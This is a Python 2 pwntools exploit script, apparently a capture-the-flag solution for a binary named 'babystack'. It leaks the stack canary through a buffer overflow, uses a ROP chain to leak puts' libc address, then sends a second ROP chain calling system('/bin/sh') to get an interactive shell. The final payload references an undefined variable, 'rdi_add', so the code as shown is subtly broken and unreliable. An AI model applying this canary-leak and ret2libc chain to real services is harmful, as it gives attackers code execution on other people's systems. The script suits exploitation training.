from pwn import *

#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']

#p=remote("",)
p=process("./babystack")
libc=ELF("libc-2.23.so")
e=ELF("babystack")

def gets(padding):
	p.sendlineafter(">> " , "1")
	p.send(padding)	
	
def printf():
	p.sendafter(">> " , "2")
	
#   leak candy
payload="A" * 0x88
gets(payload)
printf()
p.recvuntil("A"*136)
candy=u64(p.recv(8)) - 0xa

print "Candy : " + hex(candy)

#   ret to libc
pop_add=0x0000000000400a93
main_add=0x400908


puts_off=libc.symbols["puts"]
sys_off=libc.symbols["system"]
off=sys_off-puts_off

read_plt=e.plt["read"]
print "read_plt="+hex(read_plt)
read_got=e.got["read"]
print "read_got="+hex(read_got)

puts_plt=e.plt["puts"]
print "puts_plt="+hex(puts_plt)
puts_got=e.got["puts"]
print "puts_got="+hex(puts_got)

payload1="A"*0x88 + p64(candy) + "A" * 0x9 +p64(pop_add)+p64(puts_got)+p64(puts_plt)+p64(main_add)

gets(payload1)
printf()

puts_real=u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
print "puts_realadd="+hex(puts_real)
binsh_add= puts_real - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
print "binsh_add="+hex(binsh_add)

sys_add = puts_real - (libc.symbols['puts'] - libc.symbols['system'])
print "sys_add="+hex(sys_add)

payload2="A"*0x88 + p64(candy) + "A" * 0x9+p64(rdi_add)+p64(binsh_add)+p64(sys_add)

gets(payload2)
printf()


p.interactive()




